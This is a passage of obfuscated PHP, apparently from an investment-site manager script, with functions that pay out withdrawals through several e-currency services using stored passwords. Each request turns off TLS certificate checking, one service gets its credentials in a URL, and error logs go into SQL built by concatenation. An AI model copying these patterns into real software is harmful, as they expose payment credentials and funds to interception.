      $elnlcCQAl = rawurlencode ($elnlcCQAl);
      curl_setopt ($elnlcJkNgH, CURLOPT_URL, 'https://www.e-gold.com/acct/confirm.asp');
      curl_setopt ($elnlcJkNgH, CURLOPT_POST, 1);
      curl_setopt ($elnlcJkNgH, CURLOPT_POSTFIELDS, 'AccountID=' . rawurlencode ($elnlcJutIa[$elnlcEuoJk['elnlcJDLb']]) . '&PassPhrase=' . rawurlencode ($elnlctRwF) . '&Payee_Account=' . rawurlencode ($elnlcDslPO) . '&Amount=' . rawurlencode ($elnlcdPCw) . '&PAY_IN=' . rawurlencode ($elnlcJutIa[$elnlcEuoJk['elnlcfPsp']]) . ('' . '&WORTH_OF=Gold&Memo=' . $elnlcCQAl . '&IGNORE_RATE_CHANGE=y'));
      curl_setopt ($elnlcJkNgH, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcJkNgH, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcJkNgH);
      curl_close ($elnlcJkNgH);
      $elnlcUfak = array ();
      if (preg_match ('/<input type=hidden name=PAYMENT_BATCH_NUM VALUE="(\\d+)">/ims', $a, $elnlcUfak))
      {
        return array (1, '', $elnlcUfak[1]);
      }
      else
      {
        if (preg_match ('/<input type=hidden name=ERROR VALUE="(.*?)">/ims', $a, $elnlcUfak))
        {
          $elnlcWsag = preg_replace ('/&lt;/i', '<', $elnlcUfak[1]);
          $elnlcWsag = preg_replace ('/&gt;/i', '>', $elnlcWsag);
          $e = elnlcmzdkr ('' . $elnlcgPrNl . ' ' . $elnlcWsag);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcgPrNl . ('' . ' ' . $elnlcWsag), '');
        }
        else
        {
          $e = elnlcmzdkr ('' . $elnlcgPrNl . ' Unknown error');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcgPrNl . ' Unknown error', '');
        }
      }
    }
    else
    {
      $e = elnlcmzdkr ('' . $elnlcgPrNl . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcgPrNl . ' Curl functions are not available');
    }

  }

  function elnlclceyy ($elnlcOhRB, $elnlcdPCw, $elnlcDslPO, $elnlcCQAl, $elnlcgPrNl)
  {
    global $elnlcEuoJk;
    global $elnlcJutIa;
    if ($elnlcJutIa[$elnlcEuoJk['elnlcNUQQL']] == $elnlcEuoJk['elnlcMdla'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcJutIa[$elnlcEuoJk['elnlcctILW']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcDslPO == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to AlertPay account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid AlertPay account', '');
    }

    list ($elnlckNTHO, $elnlcnzOA) = elnlcgushn ($elnlcDslPO, 11);
    if ($elnlckNTHO == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcnzOA . '\'';
      mysql_query ($q);
      return array (0, $elnlcnzOA);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcOhRB == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'alertpay_account_password\'';
        $elnlcbaLW = mysql_query ($q);
        while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
        {
          $elnlcPmgg = elnlcefsf ($elnlcTnMjL[$elnlcEuoJk['elnlcBVfc']], $elnlcEuoJk['elnlcdmCFO']);
        }
      }
      else
      {
        $elnlcPmgg = $elnlcOhRB;
      }

      $elnlcJkNgH = curl_init ();
      $elnlcCQAl = rawurlencode ($elnlcCQAl);
      $elnlcRDaq = sprintf ('USER=%s&PASSWORD=%s&AMOUNT=%s&CURRENCY=%s&RECEIVEREMAIL=%s&SENDEREMAIL=%s&PURCHASETYPE=%s&NOTE=%s&TESTMODE=%s', urlencode ($elnlcJutIa[$elnlcEuoJk['elnlcRHgv']]), urlencode ($elnlcPmgg), urlencode ($elnlcdPCw), 'USD', urlencode ($elnlcDslPO), '', 0, urlencode ($elnlcCQAl), 0);
      curl_setopt ($elnlcJkNgH, CURLOPT_URL, $elnlcEuoJk['elnlcQvoI']);
      curl_setopt ($elnlcJkNgH, CURLOPT_POST, true);
      curl_setopt ($elnlcJkNgH, CURLOPT_POSTFIELDS, $elnlcRDaq);
      curl_setopt ($elnlcJkNgH, CURLOPT_RETURNTRANSFER, true);
      curl_setopt ($elnlcJkNgH, CURLOPT_HEADER, false);
      curl_setopt ($elnlcJkNgH, CURLOPT_TIMEOUT, 30);
      curl_setopt ($elnlcJkNgH, CURLOPT_SSL_VERIFYPEER, false);
      $a = curl_exec ($elnlcJkNgH);
      curl_close ($elnlcJkNgH);
      parse_str (urldecode ($a), $elnlcGAKg);
      $elnlcUfak = array ();
      if ($elnlcGAKg[$elnlcEuoJk['elnlcqgTz']] == 100)
      {
        return array (1, '', $elnlcGAKg[$elnlcEuoJk['elnlcdUHK']]);
      }
      else
      {
        if (200 < $elnlcGAKg[$elnlcEuoJk['elnlcqgTz']])
        {
          $elnlcWsag = $elnlcGAKg[$elnlcEuoJk['elnlcqgTz']] . ': ' . $elnlcGAKg[$elnlcEuoJk['elnlcaIae']];
          $e = elnlcmzdkr ('' . $elnlcgPrNl . ' ' . $elnlcWsag);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcgPrNl . ('' . ' ' . $elnlcWsag), '');
        }
        else
        {
          $e = elnlcmzdkr ('' . $elnlcgPrNl . ' Unknown error');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcgPrNl . ' Unknown error', '');
        }
      }
    }
    else
    {
      $e = elnlcmzdkr ('' . $elnlcgPrNl . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcgPrNl . ' Curl functions are not available');
    }

  }

  function elnlcyluxu ($elnlcOhRB, $elnlcdPCw, $elnlcDslPO, $elnlcCQAl, $elnlcgPrNl)
  {
    global $elnlcEuoJk;
    global $elnlcJutIa;
    $elnlcdPCw = sprintf ('%0.2f', floor ($elnlcdPCw * 100) / 100);
    if ($elnlcJutIa[$elnlcEuoJk['elnlcctILW']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcDslPO == 0)
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can not process withdrawal to Evocash account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid EvoCash account', '');
    }

    list ($elnlckNTHO, $elnlcnzOA) = elnlcgushn ($elnlcDslPO, 1);
    if ($elnlckNTHO == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcnzOA . '\'';
      mysql_query ($q);
      return array (0, $elnlcnzOA);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcOhRB == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'evocash_account_password\'';
        $elnlcbaLW = mysql_query ($q);
        while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
        {
          $elnlceWcv = elnlcefsf ($elnlcTnMjL[$elnlcEuoJk['elnlcBVfc']], $elnlcEuoJk['elnlcdmCFO']);
        }

        $q = 'select v from hm2_pay_settings where n=\'evocash_transaction_code\'';
        $elnlcbaLW = mysql_query ($q);
        while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
        {
          $elnlcyhkV = elnlcefsf ($elnlcTnMjL[$elnlcEuoJk['elnlcBVfc']], $elnlcEuoJk['elnlcdmCFO']);
        }
      }
      else
      {
        list ($elnlceWcv, $elnlcyhkV) = preg_split ('/\\|/', $elnlcOhRB);
      }

      $elnlcJkNgH = curl_init ();
      $elnlcCQAl = rawurlencode ($elnlcCQAl);
      curl_setopt ($elnlcJkNgH, CURLOPT_URL, 'https://www.evocash.com/evoswift/instantpayment.cfm?payingaccountid=' . rawurlencode ($elnlcJutIa[$elnlcEuoJk['elnlcVcpH']]) . '&username=' . rawurlencode ($elnlcJutIa[$elnlcEuoJk['elnlcMfpVi']]) . '&password=' . rawurlencode ($elnlceWcv) . '&transaction_code=' . rawurlencode ($elnlcyhkV) . '&amount=' . rawurlencode ($elnlcdPCw) . ('' . '&reference=&memo=' . $elnlcCQAl . '&receivingaccountid=') . rawurlencode ($elnlcDslPO) . '');
      curl_setopt ($elnlcJkNgH, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcJkNgH, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcJkNgH);
      curl_close ($elnlcJkNgH);
      $elnlcUfak = array ();
      if (preg_match ('/<INPUT TYPE="Hidden" NAME="PayingTransactionID" VALUE="(.*?)">/ims', $a, $elnlcUfak))
      {
        return array (1, '', $elnlcUfak[1]);
      }
      else
      {
        if (preg_match ('/<INPUT TYPE="Hidden" NAME="Error" VALUE="(.*?)">/ims', $a, $elnlcUfak))
        {
          $elnlcWsag = $elnlcUfak[1];
          $e = elnlcmzdkr ('' . $elnlcgPrNl . ' ' . $elnlcWsag);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcgPrNl . ('' . ' ' . $elnlcWsag), '');
        }
        else
        {
          $e = elnlcmzdkr ('' . $elnlcgPrNl . ' Unknown error');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcgPrNl . ' Unknown error', '');
        }
      }
    }
    else
    {
      $e = elnlcmzdkr ('' . $elnlcgPrNl . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcgPrNl . ' Curl functions are not available');
    }

  }

  function elnlcnrqdk ($elnlcOhRB, $elnlcdPCw, $elnlcDslPO, $elnlcCQAl, $elnlcgPrNl)
  {
    global $elnlcEuoJk;
    global $elnlcJutIa;
    if ($elnlcJutIa[$elnlcEuoJk['elnlcNUQQL']] == $elnlcEuoJk['elnlcMdla'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcJutIa[$elnlcEuoJk['elnlcctILW']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcDslPO == 0)
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to IntGold account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid IntGold account', '');
    }

    list ($elnlckNTHO, $elnlcnzOA) = elnlcgushn ($elnlcDslPO, 2);
    if ($elnlckNTHO == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcnzOA . '\'';
      mysql_query ($q);
      return array (0, $elnlcnzOA);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcOhRB == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'intgold_password\'';
        $elnlcbaLW = mysql_query ($q);
        while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
        {
          $elnlccNQwD = elnlcefsf ($elnlcTnMjL[$elnlcEuoJk['elnlcBVfc']], $elnlcEuoJk['elnlcdmCFO']);
        }
      }
      else
      {
        $elnlccNQwD = $elnlcOhRB;
      }

      if ($elnlcOhRB == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'intgold_password\'';
        $elnlcbaLW = mysql_query ($q);
        while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
        {
          $elnlccNQwD = elnlcefsf ($elnlcTnMjL[$elnlcEuoJk['elnlcBVfc']], $elnlcEuoJk['elnlcdmCFO']);
        }

        $q = 'select v from hm2_pay_settings where n=\'intgold_transaction_code\'';
        $elnlcbaLW = mysql_query ($q);
        while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
        {
          $elnlcaycLD = elnlcefsf ($elnlcTnMjL[$elnlcEuoJk['elnlcBVfc']], $elnlcEuoJk['elnlcdmCFO']);
        }
      }
      else
      {
        list ($elnlccNQwD, $elnlcaycLD) = preg_split ('/\\|/', $elnlcOhRB);
      }

      $elnlcJkNgH = curl_init ();
      $elnlcCQAl = rawurlencode ($elnlcCQAl);
      curl_setopt ($elnlcJkNgH, CURLOPT_URL, 'https://intgold.com/cgi-bin/autopay.cgi');
      curl_setopt ($elnlcJkNgH, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcJkNgH, CURLOPT_POST, 1);
      curl_setopt ($elnlcJkNgH, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)');
      curl_setopt ($elnlcJkNgH, CURLOPT_POSTFIELDS, 'ACCOUNTID=' . rawurlencode ($elnlcJutIa[$elnlcEuoJk['elnlcKETl']]) . '&PASSWORD=' . rawurlencode ($elnlccNQwD) . '&SECPASSWORD=' . rawurlencode ($elnlcaycLD) . '&RECEIVER=' . rawurlencode ($elnlcDslPO) . '&AMOUNT=' . rawurlencode ($elnlcdPCw) . '&NOTE=' . $elnlcCQAl);
      curl_setopt ($elnlcJkNgH, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt ($elnlcJkNgH, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcJkNgH);
      curl_close ($elnlcJkNgH);
      $elnlcUfak = array ();
      if (preg_match ('' . '/Success\\s*TRANSACTION_ID:(.*?)$/ims', $a, $elnlcUfak))
      {
        return array (1, '', $elnlcUfak[1]);
      }
      else
      {
        $e = elnlcmzdkr ('' . $elnlcgPrNl . ' ' . $a);
        $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
        mysql_query ($q);
        return array (0, $elnlcgPrNl . ('' . ' ' . $a), '');
      }
    }
    else
    {
      $e = elnlcmzdkr ('' . $elnlcgPrNl . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcgPrNl . ' Curl functions are not available');
    }

  }

  function elnlckrned ($elnlcOhRB, $elnlcdPCw, $elnlcDslPO, $elnlcCQAl, $elnlcgPrNl)
  {
    global $elnlcEuoJk;
    global $elnlcJutIa;
    if ($elnlcJutIa[$elnlcEuoJk['elnlcNUQQL']] == $elnlcEuoJk['elnlcMdla'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcJutIa[$elnlcEuoJk['elnlcctILW']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcDslPO == 0)
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to eeeCureency account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid eeeCurrency account', '');
    }

    list ($elnlckNTHO, $elnlcnzOA) = elnlcgushn ($elnlcDslPO, 8);
    if ($elnlckNTHO == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcnzOA . '\'';
      mysql_query ($q);
      return array (0, $elnlcnzOA);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcOhRB == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'eeecurrency_password\'';
        $elnlcbaLW = mysql_query ($q);
        while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
        {
          $elnlcNltbm = elnlcefsf ($elnlcTnMjL[$elnlcEuoJk['elnlcBVfc']], $elnlcEuoJk['elnlcdmCFO']);
        }

        $q = 'select v from hm2_pay_settings where n=\'eeecurrency_transaction_code\'';
        $elnlcbaLW = mysql_query ($q);
        while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
        {
          $elnlcIUlRo = elnlcefsf ($elnlcTnMjL[$elnlcEuoJk['elnlcBVfc']], $elnlcEuoJk['elnlcdmCFO']);
        }
      }
      else
      {
        list ($elnlcNltbm, $elnlcIUlRo) = preg_split ('/\\|/', $elnlcOhRB);
      }

      $elnlcJkNgH = curl_init ();
      $elnlcCQAl = rawurlencode ($elnlcCQAl);
      curl_setopt ($elnlcJkNgH, CURLOPT_URL, 'https://eeecurrency.com/cgi-bin/autopay.cgi');
      curl_setopt ($elnlcJkNgH, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcJkNgH, CURLOPT_POST, 1);
      curl_setopt ($elnlcJkNgH, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)');
      curl_setopt ($elnlcJkNgH, CURLOPT_POSTFIELDS, 'ACCOUNTID=' . rawurlencode ($elnlcJutIa[$elnlcEuoJk['elnlcJjdjd']]) . '&PASSWORD=' . rawurlencode ($elnlcNltbm) . '&SECPASSWORD=' . rawurlencode ($elnlcIUlRo) . '&RECEIVER=' . rawurlencode ($elnlcDslPO) . '&AMOUNT=' . rawurlencode ($elnlcdPCw) . ('' . '&NOTE=' . $elnlcCQAl));
      curl_setopt ($elnlcJkNgH, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcJkNgH);
      curl_close ($elnlcJkNgH);
      $elnlcUfak = array ();
      if (preg_match ('' . '/Success\\s*TRANSACTION_ID:(.*?)$/ims', $a, $elnlcUfak))
      {
        return array (1, '', $elnlcUfak[1]);
      }
      else
      {
        $e = elnlcmzdkr ('' . $elnlcgPrNl . ' ' . $a);
        $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
        mysql_query ($q);
        return array (0, $elnlcgPrNl . ('' . ' ' . $a), '');
      }
    }
    else
    {
      $e = elnlcmzdkr ('' . $elnlcgPrNl . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcgPrNl . ' Curl functions are not available');
    }

  }

  function elnlcpsui ($elnlcOhRB, $elnlcdPCw, $elnlcDslPO, $elnlcCQAl, $elnlcgPrNl)
  {
    global $elnlcEuoJk;
    global $elnlcJutIa;
    if ($elnlcJutIa[$elnlcEuoJk['elnlcNUQQL']] == $elnlcEuoJk['elnlcMdla'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcJutIa[$elnlcEuoJk['elnlcctILW']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcDslPO == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty Pecunix account.\'';
      mysql_query ($q);
      return array (0, 'Invalid Pecunix account', '');
    }

    list ($elnlckNTHO, $elnlcnzOA) = elnlcgushn ($elnlcDslPO, 9);
    if ($elnlckNTHO == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcnzOA . '\'';
      mysql_query ($q);
      return array (0, $elnlcnzOA);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcOhRB == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'pecunix_password\'';
        $elnlcbaLW = mysql_query ($q);
        while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
        {
          $elnlcTCDV = elnlcefsf ($elnlcTnMjL[$elnlcEuoJk['elnlcBVfc']], $elnlcEuoJk['elnlcdmCFO']);
        }
      }
      else
      {
        $elnlcTCDV = $elnlcOhRB;
      }

      $elnlcJkNgH = curl_init ();
      $elnlcgVMW = elnlcbtet ('{px_time}');
      $elnlcOHCQ = strtoupper (md5 ($elnlcTCDV . ':' . $elnlcgVMW));
      $elnlcRDaq = '
    <TransferRequest>
      <Transfer>
        <TransferId> </TransferId>
        <Payer> ' . htmlentities ($elnlcJutIa[$elnlcEuoJk['elnlcImgM']], ENT_NOQUOTES) . ' </Payer>
        <Payee> ' . htmlentities ($elnlcDslPO, ENT_NOQUOTES) . ' </Payee>
        <CurrencyId> GAU </CurrencyId>
        <Equivalent>
          <CurrencyId> USD </CurrencyId>
          <Amount> ' . htmlentities ($elnlcdPCw, ENT_NOQUOTES) . ' </Amount>
        </Equivalent>
        <FeePaidBy> Payee </FeePaidBy>
        <Memo> ' . htmlentities ($elnlcCQAl, ENT_NOQUOTES) . ('' . ' </Memo>
      </Transfer>
      <Auth>
        <Token> ' . $elnlcOHCQ . ' </Token>
      </Auth>
    </TransferRequest>
    ');
      $elnlcJkNgH = curl_init ();
      curl_setopt ($elnlcJkNgH, CURLOPT_URL, 'https://pxi.pecunix.com/money.refined...transfer');
      curl_setopt ($elnlcJkNgH, CURLOPT_POST, 1);
      curl_setopt ($elnlcJkNgH, CURLOPT_POSTFIELDS, $elnlcRDaq);
      curl_setopt ($elnlcJkNgH, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcJkNgH, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcJkNgH);
      curl_close ($elnlcJkNgH);
      $elnlcNiWo = elnlcsgyi ($a);
      if ($elnlcNiWo[$elnlcEuoJk['elnlcCegwQ']] == $elnlcEuoJk['elnlcffPD'])
      {
        return array (1, '', $elnlcNiWo[$elnlcEuoJk['elnlcGPoCs']]);
      }
      else
      {
        if ($elnlcNiWo[$elnlcEuoJk['elnlcCegwQ']] == $elnlcEuoJk['elnlcgCmxF'])
        {
          $e = elnlcmzdkr ('' . $elnlcgPrNl . ' ' . $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] . ' ' . $elnlcNiWo[$elnlcEuoJk['elnlcnQeB']]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = elnlcmzdkr ('' . $elnlcgPrNl . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = elnlcmzdkr ('' . $elnlcgPrNl . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcgPrNl . ' Curl functions are not available');
    }

  }

  function elnlcjsnlj ($elnlcOhRB, $elnlcdPCw, $elnlcDslPO, $elnlcCQAl, $elnlcgPrNl)
  {
    global $elnlcEuoJk;
    global $elnlcJutIa;
    if ($elnlcJutIa[$elnlcEuoJk['elnlcNUQQL']] == $elnlcEuoJk['elnlcMdla'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcJutIa[$elnlcEuoJk['elnlcctILW']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcDslPO == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty LibertyReserve account.\'';
      mysql_query ($q);
      return array (0, 'Invalid LibertyReserve account', '');
    }

    list ($elnlckNTHO, $elnlcnzOA) = elnlcgushn ($elnlcDslPO, 15);
    if ($elnlckNTHO == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcnzOA . '\'';
      mysql_query ($q);
      return array (0, $elnlcnzOA);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcOhRB == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'libertyreserve_password\'';
        $elnlcbaLW = mysql_query ($q);
        while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
        {
          $elnlccHlkM = elnlcefsf ($elnlcTnMjL[$elnlcEuoJk['elnlcBVfc']], $elnlcEuoJk['elnlcdmCFO']);
        }

        $elnlcMpcQL = $elnlcJutIa[$elnlcEuoJk['elnlcbzOmi']];
      }
      else
      {
        list ($elnlccHlkM, $elnlcMpcQL) = preg_split ('/\\|/', $elnlcOhRB);
      }

      $elnlcJkNgH = curl_init ();
      $elnlcOHCQ = strtoupper (elnlcbtet ($elnlccHlkM . ':{lr_time}'));
      $elnlcRDaq = '<TransferRequest id="' . rand (1000000, 9999999) . '">
  <Auth>
    <ApiName>' . htmlspecialchars ($elnlcMpcQL) . ('' . '</ApiName>
    <Token>' . $elnlcOHCQ . '</Token>
  </Auth>
  <Transfer>
    <TransferType>transfer</TransferType>
    <Payer>') . htmlentities ($elnlcJutIa[$elnlcEuoJk['elnlcHuQp']], ENT_NOQUOTES) . '</Payer>
    <Payee>' . htmlentities ($elnlcDslPO, ENT_NOQUOTES) . '</Payee>
    <CurrencyId>' . htmlentities ($elnlcJutIa[$elnlcEuoJk['elnlcvepEe']]) . '</CurrencyId>
    <Amount>' . htmlentities ($elnlcdPCw, ENT_NOQUOTES) . '</Amount>
    <Memo>' . htmlentities ($elnlcCQAl, ENT_NOQUOTES) . '</Memo>
    <Anonymous>false</Anonymous>
  </Transfer>
</TransferRequest>';
      $elnlcJkNgH = curl_init ();
      curl_setopt ($elnlcJkNgH, CURLOPT_URL, 'https://api.libertyreserve.com/xml/transfer.aspx?req=' . urlencode ($elnlcRDaq));
      curl_setopt ($elnlcJkNgH, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcJkNgH, CURLOPT_RETURNTRANSFER, 1);
      $elnlcBkmp = array ('User-Agent: Mozilla/5.0');
      curl_setopt ($elnlcJkNgH, CURLOPT_HTTPHEADER, $elnlcBkmp);
      $a = curl_exec ($elnlcJkNgH);
      curl_close ($elnlcJkNgH);
      $elnlcJutIa[$elnlcEuoJk['elnlcrFBl']] = $elnlcRDaq;
      $elnlcJutIa[$elnlcEuoJk['elnlcNwdyU']] = $a;
      $elnlcNiWo = elnlclcgq ($a);
      if ($elnlcNiWo[$elnlcEuoJk['elnlcCegwQ']] == $elnlcEuoJk['elnlcffPD'])
      {
        return array (1, '', $elnlcNiWo[$elnlcEuoJk['elnlcGPoCs']]);
      }
      else
      {
        if ($elnlcNiWo[$elnlcEuoJk['elnlcCegwQ']] == $elnlcEuoJk['elnlcgCmxF'])
        {
          $e = elnlcmzdkr ('' . $elnlcgPrNl . ' ' . $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] . '<br>' . $elnlcNiWo[$elnlcEuoJk['elnlcnQeB']]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = elnlcmzdkr ('' . $elnlcgPrNl . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = elnlcmzdkr ('' . $elnlcgPrNl . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcgPrNl . ' Curl functions are not available');
    }

  }

  function elnlcggxpg ($elnlcOhRB, $elnlcdPCw, $elnlcDslPO, $elnlcCQAl, $elnlcgPrNl)
  {
    global $elnlcEuoJk;
    global $elnlcJutIa;
    if ($elnlcJutIa[$elnlcEuoJk['elnlcNUQQL']] == $elnlcEuoJk['elnlcMdla'])
    {
    }

    if ($elnlcJutIa[$elnlcEuoJk['elnlcctILW']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcDslPO == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty V-Money account.\'';
      mysql_query ($q);
      return array (0, 'Invalid V-Money account', '');
    }

    list ($elnlckNTHO, $elnlcnzOA) = elnlcgushn ($elnlcDslPO, 16);
    if ($elnlckNTHO == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcnzOA . '\'';
      mysql_query ($q);
      return array (0, $elnlcnzOA);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcOhRB == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'vmoney_password\'';
        $elnlcbaLW = mysql_query ($q);
        while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
        {
          $elnlcUlhb = elnlcefsf ($elnlcTnMjL[$elnlcEuoJk['elnlcBVfc']], $elnlcEuoJk['elnlcdmCFO']);
        }
      }
      else
      {
        $elnlcUlhb = $elnlcOhRB;
      }

      $elnlcOHCQ = md5 ($elnlcJutIa[$elnlcEuoJk['elnlcItNK']] . $elnlcUlhb . elnlcbtet ('{vm_time}'));
      $elnlcRDaq = '<Request>
	<Type>Transfer</Type>
	<Auth>
		<AccountId>' . htmlentities ($elnlcJutIa[$elnlcEuoJk['elnlcItNK']], ENT_NOQUOTES) . ('' . '</AccountId>
		<Token>' . $elnlcOHCQ . '</Token>
	</Auth>
	<Transfers>
		<Transfer>
			<ID>1</ID>
			<Payee>') . htmlentities ($elnlcDslPO, ENT_NOQUOTES) . '</Payee>
			<Amount>' . htmlentities ($elnlcdPCw, ENT_NOQUOTES) . '</Amount>
			<Memo>' . htmlentities ($elnlcCQAl, ENT_NOQUOTES) . '</Memo>
		</Transfer>
	</Transfers>
        </Request>';
      $elnlcJkNgH = curl_init ();
      curl_setopt ($elnlcJkNgH, CURLOPT_URL, 'https://www.v-money.net/vai.php');
      curl_setopt ($elnlcJkNgH, CURLOPT_POST, 1);
      curl_setopt ($elnlcJkNgH, CURLOPT_POSTFIELDS, 'request_data=' . $elnlcRDaq);
      curl_setopt ($elnlcJkNgH, CURLOPT_SSL_VERIFYPEER, FALSE);
